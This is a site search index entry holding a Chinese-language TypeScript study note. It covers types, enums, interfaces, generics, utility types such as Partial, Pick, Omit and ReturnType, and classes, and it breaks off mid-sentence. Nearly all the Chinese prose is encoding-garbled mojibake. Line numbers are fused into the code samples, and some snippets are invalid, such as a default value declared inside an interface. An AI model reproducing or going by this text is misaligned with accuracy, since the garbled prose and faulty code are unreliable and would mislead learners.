<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Typescriptå­¦ä¹ ç¬”è®°]]></title>
    <url>%2F2019%2F06%2F12%2Ftypescript%2F</url>
    <content type="text"><![CDATA[å‰è¨€ Typescriptå­¦ä¹ ç¬”è®°å‰è¨€åŸºç¡€ç±»åž‹å¸ƒå°”å€¼ã€æ•°å­—åŒJS å­—ç¬¦ä¸²å­—ç¬¦ä¸²å­—é¢é‡ç±»åž‹ç”¨æ¥çº¦æŸå–å€¼åªèƒ½æ˜¯æŸå‡ ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä¸€ä¸ªã€‚ 1234567type EventNames = &apos;click&apos; | &apos;scroll&apos; | &apos;mousemove&apos;;function handleEvent(ele: Element, event: EventNames) &#123; // do something&#125;handleEvent(document.getElementById(&apos;hello&apos;), &apos;scroll&apos;); // æ²¡é—®é¢˜handleEvent(document.getElementById(&apos;world&apos;), &apos;dbclick&apos;);/ æŠ¥é”™ï¼Œevent ä¸èƒ½ä¸º &apos;dbclick&apos; å…ƒç»„Tupleè¡¨ç¤ºå·²çŸ¥å…ƒç´ æ•°é‡å’Œç±»åž‹çš„æ•°ç»„ 1234// Declare a tuple typelet x: [string, number];// Initialize itx = [&apos;hello&apos;, 10]; å½“è®¿é—®ä¸€ä¸ªè¶Šç•Œçš„å…ƒç´ ï¼Œä¼šä½¿ç”¨è”åˆç±»åž‹æ›¿ä»£ï¼š 123x[3] = &apos;world&apos;; // OK, å­—ç¬¦ä¸²å¯ä»¥èµ‹å€¼ç»™(string | number)ç±»åž‹x[6] = true; // Error, å¸ƒå°”ä¸æ˜¯(string | number)ç±»åž‹console.log(x[5].toString()); // OK, &apos;string&apos; å’Œ &apos;number&apos; éƒ½æœ‰ toString æžšä¸¾enumè‡ªå®šä¹‰ç´¢å¼•çš„æ•°ç»„ï¼Œä¸ºä¸€ç»„æ•°å€¼èµ‹äºˆå‹å¥½çš„åå­—ã€‚ç”¨äºŽå–å€¼è¢«é™å®šåœ¨ä¸€å®šèŒƒå›´å†…çš„åœºæ™¯ï¼Œæ¯”å¦‚ä¸€å‘¨åªèƒ½æœ‰ä¸ƒå¤©ï¼Œé¢œè‰²é™å®šä¸ºçº¢ç»¿è“ç­‰ 12345enum Color &#123;Red, Green, Blue&#125;// ä»Ž0å¼€å§‹ï¼Œ0,1,2ï¼›Color[Color[&quot;Red&quot;] = 0] = &quot;Red&quot;;enum Color &#123;Red = 1, Green, Blue&#125;// ä»Ž1å¼€å§‹ï¼Œ1,2,3ï¼›enum Color &#123;Red = 1, Green = 2, Blue = 4&#125;// 1,2,4ï¼›let c: Color = Color.Green;//2let colorName: string = Color[2];//ç”±æžšä¸¾çš„å€¼å¾—åˆ°å®ƒçš„åå­— Green å­—ç¬¦ä¸²æžšä¸¾å­—ç¬¦ä¸²æžšä¸¾çš„æ¦‚å¿µå¾ˆç®€å•ï¼Œä½†æ˜¯æœ‰ç»†å¾®çš„è¿è¡Œæ—¶çš„å·®åˆ«ã€‚ åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æžšä¸¾é‡Œï¼Œæ¯ä¸ªæˆå‘˜éƒ½å¿…é¡»ç”¨å­—ç¬¦ä¸²å­—é¢é‡ï¼Œæˆ–å¦å¤–ä¸€ä¸ªå­—ç¬¦ä¸²æžšä¸¾æˆå‘˜è¿›è¡Œåˆå§‹åŒ–ã€‚ 123456enum Direction &#123; Up = "UP", Down = "DOWN", Left = "LEFT", Right = "RIGHT",&#125; ç”±äºŽå­—ç¬¦ä¸²æžšä¸¾æ²¡æœ‰è‡ªå¢žé•¿çš„è¡Œä¸ºï¼Œå­—ç¬¦ä¸²æžšä¸¾å¯ä»¥å¾ˆå¥½çš„åºåˆ—åŒ–ã€‚ æ¢å¥è¯è¯´ï¼Œå¦‚æžœä½ æ­£åœ¨è°ƒè¯•å¹¶ä¸”å¿…é¡»è¦è¯»ä¸€ä¸ªæ•°å­—æžšä¸¾çš„è¿è¡Œæ—¶çš„å€¼ï¼Œè¿™ä¸ªå€¼é€šå¸¸æ˜¯å¾ˆéš¾è¯»çš„ - å®ƒå¹¶ä¸èƒ½è¡¨è¾¾æœ‰ç”¨çš„ä¿¡æ¯ï¼ˆå°½ç®¡åå‘æ˜ å°„ä¼šæœ‰æ‰€å¸®åŠ©ï¼‰ï¼Œå­—ç¬¦ä¸²æžšä¸¾å…è®¸ä½ æä¾›ä¸€ä¸ªè¿è¡Œæ—¶æœ‰æ„ä¹‰çš„å¹¶ä¸”å¯è¯»çš„å€¼ï¼Œç‹¬ç«‹äºŽæžšä¸¾æˆå‘˜çš„åå­—ã€‚ ä»»æ„å€¼anyä½¿ç”¨anyç±»åž‹æ¥æ ‡è®°ä¸å¸Œæœ›è¢«ç±»åž‹æ£€æŸ¥å™¨æ£€æŸ¥è€Œç›´æŽ¥é€šè¿‡ç¼–è¯‘é˜¶æ®µæ£€æŸ¥çš„å˜é‡ã€‚ å…è®¸ä½ åœ¨ç¼–è¯‘æ—¶å¯é€‰æ‹©åœ°åŒ…å«æˆ–ç§»é™¤ç±»åž‹æ£€æŸ¥ã€‚ ä½ å¯èƒ½è®¤ä¸ºObjectæœ‰ç›¸ä¼¼çš„ä½œç”¨ï¼Œå°±åƒå®ƒåœ¨å…¶å®ƒè¯­è¨€ä¸­é‚£æ ·ã€‚ ä½†æ˜¯Objectç±»åž‹çš„å˜é‡åªæ˜¯å…è®¸ä½ ç»™å®ƒèµ‹ä»»æ„å€¼ - ä½†æ˜¯å´ä¸èƒ½å¤Ÿåœ¨å®ƒä¸Šé¢è°ƒç”¨ä»»æ„çš„æ–¹æ³•ï¼Œå³ä¾¿å®ƒçœŸçš„æœ‰è¿™äº›æ–¹æ³• 123456let notSure: any = 4;notSure.ifItExists(); // okay, ifItExists might exist at runtimenotSure.toFixed(); // okay, toFixed exists (but the compiler doesn&apos;t check)let prettySure: Object = 4;prettySure.toFixed(); // Error: Property &apos;toFixed&apos; doesn&apos;t exist on type &apos;Object&apos;. ç©ºå€¼void å½“ä¸€ä¸ªå‡½æ•°æ²¡æœ‰è¿”å›žå€¼æ—¶ï¼Œä½ é€šå¸¸ä¼šè§åˆ°å…¶è¿”å›žå€¼ç±»åž‹æ˜¯voidï¼š 123function warnUser(): void &#123; console.log("This is my warning message");&#125; voidç±»åž‹çš„å˜é‡åªèƒ½èµ‹äºˆä¸ºundefinedå’Œnullï¼š 1let unusable: void = undefined; Null å’Œ Undefinedé»˜è®¤æƒ…å†µä¸‹nullå’Œundefinedæ˜¯æ‰€æœ‰ç±»åž‹çš„å­ç±»åž‹ã€‚ å°±æ˜¯è¯´ä½ å¯ä»¥æŠŠnullå’Œundefinedèµ‹å€¼ç»™numberç±»åž‹çš„å˜é‡ã€‚ 123// Not much else we can assign to these variables!let u: undefined = undefined;let n: null = null; Neverneverç±»åž‹è¡¨ç¤ºçš„æ˜¯é‚£äº›æ°¸ä¸å­˜åœ¨çš„å€¼çš„ç±»åž‹ã€‚ ä¾‹å¦‚ï¼Œneverç±»åž‹æ˜¯é‚£äº›æ€»æ˜¯ä¼šæŠ›å‡ºå¼‚å¸¸æˆ–æ ¹æœ¬å°±ä¸ä¼šæœ‰è¿”å›žå€¼çš„å‡½æ•°è¡¨è¾¾å¼æˆ–ç®­å¤´å‡½æ•°è¡¨è¾¾å¼çš„è¿”å›žå€¼ç±»åž‹ï¼› å˜é‡ä¹Ÿå¯èƒ½æ˜¯neverç±»åž‹ï¼Œå½“å®ƒä»¬è¢«æ°¸ä¸ä¸ºçœŸçš„ç±»åž‹ä¿æŠ¤æ‰€çº¦æŸæ—¶ã€‚ neverç±»åž‹æ˜¯ä»»ä½•ç±»åž‹çš„å­ç±»åž‹ï¼Œä¹Ÿå¯ä»¥èµ‹å€¼ç»™ä»»ä½•ç±»åž‹ï¼›ç„¶è€Œï¼Œæ²¡æœ‰ç±»åž‹æ˜¯neverçš„å­ç±»åž‹æˆ–å¯ä»¥èµ‹å€¼ç»™neverç±»åž‹ï¼ˆé™¤äº†neveræœ¬èº«ä¹‹å¤–ï¼‰ã€‚ å³ä½¿anyä¹Ÿä¸å¯ä»¥èµ‹å€¼ç»™neverã€‚ ä¸‹é¢æ˜¯ä¸€äº›è¿”å›žneverç±»åž‹çš„å‡½æ•°ï¼š 123456789101112131415// è¿”å›žneverçš„å‡½æ•°å¿…é¡»å­˜åœ¨æ— æ³•è¾¾åˆ°çš„ç»ˆç‚¹function error(message: string): never &#123; throw new Error(message);&#125;// æŽ¨æ–­çš„è¿”å›žå€¼ç±»åž‹ä¸ºneverfunction fail() &#123; return error("Something failed");&#125;// è¿”å›žneverçš„å‡½æ•°å¿…é¡»å­˜åœ¨æ— æ³•è¾¾åˆ°çš„ç»ˆç‚¹function infiniteLoop(): never &#123; while (true) &#123; &#125;&#125; è”åˆç±»åž‹123456789101112131415let myFavoriteNumber: string | number;Dinnerè¦ä¹ˆæœ‰ fish è¦ä¹ˆæœ‰ bear// ðŸ™ Not good.interface Dinner1 &#123; fish?: number, bear?: number,&#125;// ðŸ™‚ Awesome!type Dinner2 = &#123; fish: number,&#125; | &#123; bear: number,&#125; æ˜ å°„ç±»åž‹12type Keys = &apos;option1&apos; | &apos;option2&apos;;type Flags = &#123; [K in Keys]: boolean &#125;; ç­‰ä»·äºŽ 1234type Flags = &#123; option1: boolean; option2: boolean;&#125; ç±»åž‹æ–­è¨€ç±»åž‹æ–­è¨€å¥½æ¯”å…¶å®ƒè¯­è¨€é‡Œçš„ç±»åž‹è½¬æ¢ï¼ŒæŠŠå˜é‡å½“åšæ–­è¨€çš„ç±»åž‹ï¼Œä½†æ˜¯ä¸è¿›è¡Œç‰¹æ®Šçš„æ•°æ®æ£€æŸ¥å’Œè§£æž„ã€‚ å®ƒæ²¡æœ‰è¿è¡Œæ—¶çš„å½±å“ï¼Œåªæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µèµ·ä½œç”¨ã€‚ç±»åž‹æ–­è¨€ä¸æ˜¯ç±»åž‹è½¬æ¢ï¼Œåªèƒ½æ–­è¨€æˆä¸€ä¸ªè”åˆç±»åž‹æˆ–anyä¸­çš„ç±»åž‹ã€‚ ç±»åž‹æ–­è¨€æœ‰ä¸¤ç§å½¢å¼ã€‚ å…¶ä¸€æ˜¯â€œå°–æ‹¬å·â€è¯­æ³•ï¼š 12let someValue: any = "this is a string";let strLength: number = (&lt;string&gt;someValue).length; å¦ä¸€ä¸ªä¸ºasè¯­æ³•ï¼š 12let someValue: any = "this is a string";let strLength: number = (someValue as string).length; ä¸¤ç§å½¢å¼æ˜¯ç­‰ä»·çš„ã€‚ è‡³äºŽä½¿ç”¨å“ªä¸ªå¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯å‡­ä¸ªäººå–œå¥½ï¼›ç„¶è€Œï¼Œå½“ä½ åœ¨TypeScripté‡Œä½¿ç”¨JSXæ—¶ï¼Œåªæœ‰asè¯­æ³•æ–­è¨€æ˜¯è¢«å…è®¸çš„ã€‚ 123let ro: ReadonlyArray&lt;number&gt; = a;a = ro; // error! Readonlya = ro as number[];// ç”¨ç±»åž‹æ–­è¨€é‡å†™ æŸ¥æ‰¾ç±»åž‹123456789interface Person &#123; name: string; age: number; location: string;&#125;type K1 = keyof Person; // "name" | "age" | "location"type K2 = keyof Person[]; // "length" | "push" | "pop" | "concat" | ...type K3 = keyof &#123; [x: string]: Person &#125;; // string in keyofkeyofäº§ç”Ÿè”åˆç±»åž‹,in` åˆ™å¯ä»¥éåŽ†æžšä¸¾ç±»åž‹ keyof å¯ä»¥ç”¨æ¥å–å¾—ä¸€ä¸ªå¯¹è±¡æŽ¥å£çš„æ‰€æœ‰ keyå€¼. 12345interface Foo &#123; name: string; age: number&#125;type T = keyof Foo // -&gt; "name" | "age" in åˆ™å¯ä»¥éåŽ†æžšä¸¾ç±»åž‹, ä¾‹å¦‚ 1234type Keys = "a" | "b"type Obj = &#123; [p in Keys]: any&#125; // -&gt; &#123; a: any, b: any &#125; typeof123const a: number = 3// ç›¸å½“äºŽ: const b: number = 4const b: typeof a = 4 isconst æ–­è¨€12const x = &apos;x&apos;; // has the type &apos;x&apos; let y = &apos;x&apos;; // has the type string æŽ¥å£å˜é‡ç±»åž‹123456789101112131415161718interface LabeledValue&#123; label:string; model:string=&apos;&apos;;//é»˜è®¤â€œâ€ color?:string;//å¯é€‰å±žæ€§ readonly width:number;//åªè¯»å±žæ€§,èµ‹å€¼åŽä¸èƒ½è¢«æ”¹å˜&#125;function printLabel(labeledObj: LabeledValue) &#123;//å¼•å…¥æŽ¥å£ console.log(labeledObj.label);&#125;let myObj = &#123;color: &quot;red&quot;, label: &quot;Size 10 Object&quot;, width: 10&#125;;printLabel(myObj);type Partial&lt;T&gt; = &#123; [P in keyof T]?: T[P] &#125;;//keyof T æ‹¿åˆ° T æ‰€æœ‰å±žæ€§å, ç„¶åŽ in è¿›è¡ŒéåŽ†, å°†å€¼èµ‹ç»™ P, æœ€åŽ T[P] å–å¾—ç›¸åº”å±žæ€§çš„å€¼.type Required&lt;T&gt; = &#123; [P in keyof T]-?: T[P] &#125;;//å°†å¯é€‰é¡¹ä»£è¡¨çš„ ? åŽ»æŽ‰, ä»Žè€Œè®©è¿™ä¸ªç±»åž‹å˜æˆå¿…é€‰é¡¹. ä¸Žä¹‹å¯¹åº”çš„è¿˜æœ‰ä¸ª+? , è¿™ä¸ªå«ä¹‰è‡ªç„¶ä¸Ž-?ä¹‹å‰ç›¸å, å®ƒæ˜¯ç”¨æ¥æŠŠå±žæ€§å˜æˆå¯é€‰é¡¹çš„. readonly vs conståšä¸ºå˜é‡ä½¿ç”¨çš„è¯ç”¨constï¼Œè‹¥åšä¸ºå±žæ€§åˆ™ä½¿ç”¨readonlyã€‚ å‡½æ•°ç±»åž‹ä½¿ç”¨æŽ¥å£è¡¨ç¤ºå‡½æ•°ç±»åž‹ï¼Œæˆ‘ä»¬éœ€è¦ç»™æŽ¥å£å®šä¹‰ä¸€ä¸ªè°ƒç”¨ç­¾åã€‚ å®ƒå°±åƒæ˜¯ä¸€ä¸ªåªæœ‰å‚æ•°åˆ—è¡¨å’Œè¿”å›žå€¼ç±»åž‹çš„å‡½æ•°å®šä¹‰ã€‚å‚æ•°åˆ—è¡¨é‡Œçš„æ¯ä¸ªå‚æ•°éƒ½éœ€è¦åå­—å’Œç±»åž‹ã€‚ 1234567891011121314interface SearchFunc &#123; (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(src, sub) &#123; let result = src.search(sub); return result &gt; -1;&#125;// å‡½æ•°çš„å‚æ•°åä¸éœ€è¦ä¸ŽæŽ¥å£é‡Œå®šä¹‰çš„åå­—ç›¸åŒ¹é…,åªè¦æ±‚å¯¹åº”ä½ç½®ä¸Šçš„å‚æ•°ç±»åž‹æ˜¯å…¼å®¹çš„//ç­‰ä»·mySearch = function(source: string, subString: string): boolean &#123; let result = source.search(subString); return result &gt; -1;&#125; å¯ç´¢å¼•çš„ç±»åž‹Typescriptæ”¯æŒä¸¤ç§ç´¢å¼•ç­¾åï¼šå­—ç¬¦ä¸²å’Œæ•°å­—ã€‚ å¯ä»¥åŒæ—¶ä½¿ç”¨ä¸¤ç§ç±»åž‹çš„ç´¢å¼•ï¼Œä½†æ˜¯æ•°å­—ç´¢å¼•çš„è¿”å›žå€¼å¿…é¡»æ˜¯å­—ç¬¦ä¸²ç´¢å¼•è¿”å›žå€¼ç±»åž‹çš„å­ç±»åž‹ã€‚ è¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨numberæ¥ç´¢å¼•æ—¶ï¼ŒJavaScriptä¼šå°†å®ƒè½¬æ¢æˆstringç„¶åŽå†åŽ»ç´¢å¼•å¯¹è±¡ã€‚ ä¹Ÿå°±æ˜¯è¯´ç”¨100ï¼ˆä¸€ä¸ªnumberï¼‰åŽ»ç´¢å¼•ç­‰åŒäºŽä½¿ç”¨&quot;100&quot;ï¼ˆä¸€ä¸ªstringï¼‰åŽ»ç´¢å¼•ï¼Œå› æ­¤ä¸¤è€…éœ€è¦ä¿æŒä¸€è‡´ã€‚ å¯¹æ•°ç»„çš„çº¦æŸ123456interface StringArray &#123; [index: number]: string;//è¡¨ç¤ºå®šä¹‰çš„æ•°ç»„æ˜¯keyæ˜¯numberç±»åž‹ï¼Œvalueæ˜¯stringç±»åž‹&#125;let myArray: StringArray;myArray = ["Bob", "Fred"];let myStr: string = myArray[0];//Bob å¯¹å¯¹è±¡çš„çº¦æŸ123456789101112131415interface UserObj &#123; [index: string]: string&#125;var arr: UserObj = &#123; name: &apos;å¼ ä¸‰&apos; &#125;;interface Dictionary&lt;T&gt; &#123; [index: string]: T;&#125;;interface NumericDictionary&lt;T&gt; &#123; [index: number]: T;&#125;;const data:Dictionary&lt;number&gt; = &#123; a: 3, b: 4&#125; ç±»åž‹æŽ¥å£å¼ºåˆ¶ä¸€ä¸ªç±»åŽ»ç¬¦åˆæŸç§å¥‘çº¦ã€‚åŒæ—¶æè¿°äº†ç±»çš„å…¬å…±éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯å…¬å…±å’Œç§æœ‰ä¸¤éƒ¨åˆ†ã€‚ å®ƒä¸ä¼šå¸®ä½ æ£€æŸ¥ç±»æ˜¯å¦å…·æœ‰æŸäº›ç§æœ‰æˆå‘˜ã€‚ 123456789101112interface ClockInterface &#123; currentTime: Date; setTime(d: Date): void;&#125;class Clock implements ClockInterface &#123; currentTime: Date = new Date(); setTime(d: Date) &#123; this.currentTime = d; &#125; constructor(h: number, m: number) &#123; &#125;&#125; ç»§æ‰¿ä¸€ä¸ªæŽ¥å£å¯ä»¥ç»§æ‰¿å¤šä¸ªæŽ¥å£ï¼Œåˆ›å»ºå‡ºå¤šä¸ªæŽ¥å£çš„åˆæˆæŽ¥å£ã€‚ 123456789interface Shape &#123; color: string;&#125;interface PenStroke &#123; penWidth: number;&#125;interface Square extends Shape, PenStroke &#123; sideLength: number;&#125; æ³›åž‹æ³›åž‹å˜é‡æ³›åž‹å°±æ˜¯ï¼šç»™ç±»åž‹ä¼ å‚ 3ä¸ªä¸»è¦ç”¨é€”ï¼š å£°æ˜Žæ³›åž‹å®¹å™¨æˆ–ç»„ä»¶ã€‚æ¯”å¦‚ï¼šå„ç§å®¹å™¨ç±»Mapã€Arrayã€Setç­‰ï¼›å„ç§ç»„ä»¶ï¼Œæ¯”å¦‚React.Componentã€‚ å¯¹ç±»åž‹è¿›è¡Œçº¦æŸã€‚æ¯”å¦‚ï¼šä½¿ç”¨extendsçº¦æŸä¼ å…¥å‚æ•°ç¬¦åˆæŸç§ç‰¹å®šç»“æž„ã€‚ ç”Ÿæˆæ–°çš„ç±»åž‹ã€‚æ¯”å¦‚ï¼Œä¸Šä¸€ç« æåˆ°çš„ReturnTypeã€‚ å½“ä½¿ç”¨ TypeScript å®žçŽ°çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ‰§è¡Œå‰å°±å®šä¹‰å¥½å‡½æ•°è¿”å›žçš„ç±»åž‹ï¼Œä½†æ˜¯æˆ‘ä»¬åˆä¸èƒ½ç¡®å®šè¿™ä¸ªå¯¹è±¡åˆ°åº•æ˜¯ä»€ä¹ˆç±»åž‹ï¼Œè¿™é‡Œå°±å¯ä»¥å€ŸåŠ©æ³›åž‹æ¥å®žçŽ°ï¼šè¿™æ˜¯ä¸€ç§ä½¿è¿”å›žå€¼çš„ç±»åž‹ä¸Žä¼ å…¥å‚æ•°çš„ç±»åž‹æ˜¯ç›¸åŒçš„æ–¹æ³•ã€‚ è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ç±»åž‹å˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å˜é‡ï¼Œåªç”¨äºŽè¡¨ç¤ºç±»åž‹è€Œä¸æ˜¯å€¼ã€‚ æˆ‘ä»¬ç»™identityæ·»åŠ äº†ç±»åž‹å˜é‡Tã€‚ Tå¸®åŠ©æˆ‘ä»¬æ•èŽ·ç”¨æˆ·ä¼ å…¥çš„ç±»åž‹ï¼ˆæ¯”å¦‚ï¼šnumberï¼‰ï¼Œä¹‹åŽæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªç±»åž‹ã€‚ ä¹‹åŽæˆ‘ä»¬å†æ¬¡ä½¿ç”¨äº†Tå½“åšè¿”å›žå€¼ç±»åž‹ã€‚çŽ°åœ¨æˆ‘ä»¬å¯ä»¥çŸ¥é“å‚æ•°ç±»åž‹ä¸Žè¿”å›žå€¼ç±»åž‹æ˜¯ç›¸åŒçš„äº†ã€‚ è¿™å…è®¸æˆ‘ä»¬è·Ÿè¸ªå‡½æ•°é‡Œä½¿ç”¨çš„ç±»åž‹çš„ä¿¡æ¯ã€‚ 123456789function identity&lt;T&gt;(arg: T): T &#123;//1.å£°æ˜Žæ³›åž‹ï¼Œ2.å‚æ•°æ³›åž‹ï¼Œ3.è¿”å›žå€¼æ³›åž‹ return arg;&#125;//äº‹å…ˆä¸çŸ¥é“å®ƒæ˜¯å“ªç§ç±»åž‹ï¼Œæ‰€ä»¥ä¸èƒ½éšæ„çš„æ“ä½œå®ƒçš„å±žæ€§æˆ–æ–¹æ³•ï¼Œè¡¨æ˜Žæ³›åž‹æ˜¯ä¸ªæ•°ç»„åŽå¯ä»¥ä½¿ç”¨.lengthfunction loggingIdentity&lt;T&gt;(arg: T[]): T[] &#123; console.log(arg.length); // Array has a .length, so no more error return arg;&#125; å¤šä¸ªç±»åž‹å‚æ•°å®šä¹‰æ³›åž‹çš„æ—¶å€™ï¼Œå¯ä»¥ä¸€æ¬¡å®šä¹‰å¤šä¸ªç±»åž‹å‚æ•°ï¼š 1234function swap&lt;T, U&gt;(tuple: [T, U]): [U, T] &#123; return [tuple[1], tuple[0]];&#125;swap([7, &apos;seven&apos;]); // [&apos;seven&apos;, 7] ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª swap å‡½æ•°ï¼Œç”¨æ¥äº¤æ¢è¾“å…¥çš„å…ƒç»„ã€‚ ç´¢å¼•è®¿é—®æ“ä½œç¬¦12345function getProperty&lt;T, K extends keyof T&gt;(o: T, name: K): T[K] &#123; return o[name]; // o[name] is of type T[K]&#125;getProperty(&#123;age:18&#125;, &apos;age&apos;)//Kæ˜¯Tçš„keyï¼ŒT[K]æ˜¯Tçš„value æ³›åž‹çº¦æŸ12345678interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg: T): T &#123; console.log(arg.length); return arg;&#125; å·¥å…·æ³›åž‹Partial &amp; Pickå°†æ‰€æœ‰å±žæ€§å˜æˆå¯é€‰å±žæ€§ 12345678910111213141516//æºç type Partial&lt;T&gt; = &#123; [P in keyof T]?: T[P];&#125;;type Pick&lt;T, K extends keyof T&gt; = &#123; [P in K]: T[P];&#125;;interface User &#123; id: number; age: number; name: string;&#125;;// ç›¸å½“äºŽ: type PartialUser = &#123; id?: number; age?: number; name?: string; &#125;type PartialUser = Partial&lt;User&gt;// ç›¸å½“äºŽ: type PickUser = &#123; id: number; age: number; &#125;type PickUser = Pick&lt;User, &quot;id&quot; | &quot;age&quot;&gt; RequiredRequired çš„ä½œç”¨æ˜¯å°†ä¼ å…¥çš„å±žæ€§å˜ä¸ºå¿…é€‰é¡¹, æºç å¦‚ä¸‹ 1type Required&lt;T&gt; = &#123; [P in keyof T]-?: T[P] &#125;; -?å°†å¯é€‰é¡¹ä»£è¡¨çš„ ? åŽ»æŽ‰, ä»Žè€Œè®©è¿™ä¸ªç±»åž‹å˜æˆå¿…é€‰é¡¹. ä¸Žä¹‹å¯¹åº”çš„è¿˜æœ‰ä¸ª+? ,æŠŠå±žæ€§å˜æˆå¯é€‰é¡¹çš„. Mutable (æœªåŒ…å«)ç±»ä¼¼åœ°, å…¶å®žè¿˜æœ‰å¯¹ + å’Œ -, è¿™é‡Œè¦è¯´çš„ä¸æ˜¯å˜é‡çš„ä¹‹é—´çš„è¿›è¡ŒåŠ å‡è€Œæ˜¯å¯¹ readonly è¿›è¡ŒåŠ å‡.ä»¥ä¸‹ä»£ç çš„ä½œç”¨å°±æ˜¯å°† T çš„æ‰€æœ‰å±žæ€§çš„ readonly ç§»é™¤,ä½ ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªç›¸åçš„å‡ºæ¥. 123type Mutable&lt;T&gt; = &#123; -readonly [P in keyof T]: T[P]&#125; Readonlyå°†ä¼ å…¥çš„å±žæ€§å˜ä¸ºåªè¯»é€‰é¡¹ 1type Readonly&lt;T&gt; = &#123; readonly [P in keyof T]: T[P] &#125;; Recordå°† K ä¸­æ‰€æœ‰çš„å±žæ€§çš„å€¼è½¬åŒ–ä¸º T ç±»åž‹ 1type Record&lt;K extends keyof any, T&gt; = &#123; [P in K]: T &#125;; EEOExclude æŽ¥å—ä¸¤ä¸ªç±»åž‹ï¼ŒåŽ»é™¤Tä¸­çš„U1234type Exclude&lt;T, U&gt; = T extends U ? never : T;// ç›¸å½“äºŽ: type A = 'a'type A = Exclude&lt;'x' | 'a', 'x' | 'y' | 'z'&gt;Exclude&lt;'age'|'name','age'&gt; // 'name' Extract åŒæ ·æŽ¥å—ä¸¤ä¸ªç±»åž‹ï¼Œæå–Tä¸­çš„U1Extract&lt;'age'|'name'|'height','age'|'weight'&gt; // 'age' Omit12345678type Omit&lt;T, K extends keyof any&gt; = Pick&lt;T, Exclude&lt;keyof T, K&gt;&gt;;interface User &#123; id: number; age: number; name: string;&#125;;// ç›¸å½“äºŽ: type PickUser = &#123; age: number; name: string; &#125;type OmitUser = Omit&lt;User, &quot;id&quot;&gt; ReturnTypeåœ¨é˜…è¯»æºç ä¹‹å‰æˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹ infer è¿™ä¸ªå…³é”®å­—, åœ¨æ¡ä»¶ç±»åž‹è¯­å¥ä¸­, æˆ‘ä»¬å¯ä»¥ç”¨ infer å£°æ˜Žä¸€ä¸ªç±»åž‹å˜é‡å¹¶ä¸”å¯¹å®ƒè¿›è¡Œä½¿ç”¨,æˆ‘ä»¬å¯ä»¥ç”¨å®ƒèŽ·å–å‡½æ•°çš„è¿”å›žç±»åž‹ï¼Œ æºç å¦‚ä¸‹ 12345type ReturnType&lt;T&gt; = T extends ( ...args: any[]) =&gt; infer R ? R : any; å…¶å®žè¿™é‡Œçš„ infer R å°±æ˜¯å£°æ˜Žä¸€ä¸ªå˜é‡æ¥æ‰¿è½½ä¼ å…¥å‡½æ•°ç­¾åçš„è¿”å›žå€¼ç±»åž‹, ç®€å•è¯´å°±æ˜¯ç”¨å®ƒå–åˆ°å‡½æ•°è¿”å›žå€¼çš„ç±»åž‹æ–¹ä¾¿ä¹‹åŽä½¿ç”¨.å…·ä½“ç”¨æ³• 1234function foo(x: number): Array&lt;number&gt; &#123; return [x];&#125;type fn = ReturnType&lt;typeof foo&gt;; AxiosReturnType (æœªåŒ…å«)å¼€å‘ç»å¸¸ä½¿ç”¨ axios è¿›è¡Œå°è£… APIå±‚ è¯·æ±‚, é€šå¸¸æ˜¯ä¸€ä¸ªå‡½æ•°è¿”å›žä¸€ä¸ª AxiosPromise&lt;Resp&gt;, çŽ°åœ¨æˆ‘æƒ³å–åˆ°å®ƒçš„ Resp ç±»åž‹, æ ¹æ®ä¸Šä¸€ä¸ªå·¥å…·æ³›åž‹çš„çŸ¥è¯†æˆ‘ä»¬å¯ä»¥è¿™æ ·å†™. 12345import &#123; AxiosPromise &#125; from 'axios' // å¯¼å…¥æŽ¥å£type AxiosReturnType&lt;T&gt; = T extends (...args: any[]) =&gt; AxiosPromise&lt;infer R&gt; ? R : any// ä½¿ç”¨type Resp = AxiosReturnType&lt;Api&gt; // æ³›åž‹å‚æ•°ä¸­ä¼ å…¥ä½ çš„ Api è¯·æ±‚å‡½æ•° ç±»å…¬æœ‰ç§æœ‰TypeScripté‡Œï¼Œæˆå‘˜éƒ½é»˜è®¤ä¸ºpublicã€‚å½“æˆå‘˜è¢«æ ‡è®°æˆprivateæ—¶ï¼Œå®ƒå°±ä¸èƒ½åœ¨å£°æ˜Žå®ƒçš„ç±»çš„å¤–éƒ¨è®¿é—®ã€‚ TypeScriptä½¿ç”¨çš„æ˜¯ç»“æž„æ€§ç±»åž‹ç³»ç»Ÿã€‚ å½“æˆ‘ä»¬æ¯”è¾ƒä¸¤ç§ä¸åŒçš„ç±»åž‹æ—¶ï¼Œå¹¶ä¸åœ¨ä¹Žå®ƒä»¬ä»Žä½•å¤„è€Œæ¥ï¼Œå¦‚æžœæ‰€æœ‰æˆå‘˜çš„ç±»åž‹éƒ½æ˜¯å…¼å®¹çš„ï¼Œæˆ‘ä»¬å°±è®¤ä¸ºå®ƒä»¬çš„ç±»åž‹æ˜¯å…¼å®¹çš„ã€‚ ç„¶è€Œï¼Œå½“æˆ‘ä»¬æ¯”è¾ƒå¸¦æœ‰privateæˆ–protectedæˆå‘˜çš„ç±»åž‹çš„æ—¶å€™ï¼Œæƒ…å†µå°±ä¸åŒäº†ã€‚ å¦‚æžœå…¶ä¸­ä¸€ä¸ªç±»åž‹é‡ŒåŒ…å«ä¸€ä¸ªprivateæˆå‘˜ï¼Œé‚£ä¹ˆåªæœ‰å½“å¦å¤–ä¸€ä¸ªç±»åž‹ä¸­ä¹Ÿå­˜åœ¨è¿™æ ·ä¸€ä¸ªprivateæˆå‘˜ï¼Œ 